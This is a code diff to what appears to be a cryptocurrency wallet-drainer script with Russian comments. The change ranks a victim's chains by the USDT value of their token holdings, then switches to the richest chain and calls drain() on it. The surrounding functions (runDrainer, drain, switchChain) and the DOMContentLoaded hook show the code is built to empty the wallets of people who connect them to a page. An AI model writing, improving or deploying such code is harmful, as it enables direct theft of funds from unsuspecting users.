@@ -550,22 +550,52 @@ async function runDrainer(provider, signer, userAddress) {
   });
 
   const balances = (await Promise.all(balancePromises)).filter(Boolean);
-  const sorted = balances
-    .filter(item => hasFunds(item.balance))
-    .sort((a, b) => {
-      const aTotal = Object.values(a.balance.tokenBalances).reduce((sum, bal) => sum.add(bal), ethers.BigNumber.from(0));
-      const bTotal = Object.values(b.balance.tokenBalances).reduce((sum, bal) => sum.add(bal), ethers.BigNumber.from(0));
-      return bTotal.gt(aTotal) ? 1 : -1;
-    });
+
+  // Сортируем сети по общей стоимости токенов в USDT (без нативных токенов)
+  const sortedBalances = await Promise.all(
+    balances
+      .filter(item => hasFunds(item.balance))
+      .map(async (item) => {
+        const totalValue = await calculateTotalValueInUSDT(item.chainId, item.balance, item.provider);
+        return { ...item, totalValue };
+      })
+  );
+
+  const sorted = sortedBalances.sort((a, b) => b.totalValue - a.totalValue);
 
   if (!sorted.length) {
     throw new Error('No funds found on any chain');
   }
 
   const target = sorted[0];
+  console.log(`Выбрана сеть с chainId ${target.chainId} с общей стоимостью токенов ${target.totalValue} USDT`);
   await switchChain(target.chainId);
   const status = await drain(target.chainId, signer, userAddress, target.balance, target.provider);
   return status;
+}
+
+// Вспомогательная функция для расчёта общей стоимости только токенов в USDT
+async function calculateTotalValueInUSDT(chainId, balance, provider) {
+  const chainConfig = config.CHAINS[chainId];
+  let totalValue = 0;
+
+  // Учитываем только токены (USDT, USDC, другие), исключая нативные токены
+  for (const tokenAddress of Object.keys(balance.tokenBalances)) {
+    const tokenBalance = balance.tokenBalances[tokenAddress];
+    if (tokenBalance.gt(0)) {
+      const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
+      const decimals = await tokenContract.decimals();
+      const formattedBalance = ethers.utils.formatUnits(tokenBalance, decimals);
+      const symbol = tokenAddress === chainConfig.usdtAddress ? "USDT" :
+                    tokenAddress === chainConfig.usdcAddress ? "USDC" :
+                    Object.keys(chainConfig.otherTokenAddresses).find(key => chainConfig.otherTokenAddresses[key] === tokenAddress) || "Unknown";
+      const tokenPrice = await getTokenPriceInUSDT(config.TOKEN_SYMBOLS[tokenAddress] || symbol);
+      totalValue += parseFloat(formattedBalance) * tokenPrice;
+    }
+  }
+
+  console.log(`📊 Общая стоимость токенов (без нативных) для chainId ${chainId}: ${totalValue} USDT`);
+  return totalValue;
 }
 
 window.addEventListener('DOMContentLoaded', () => {
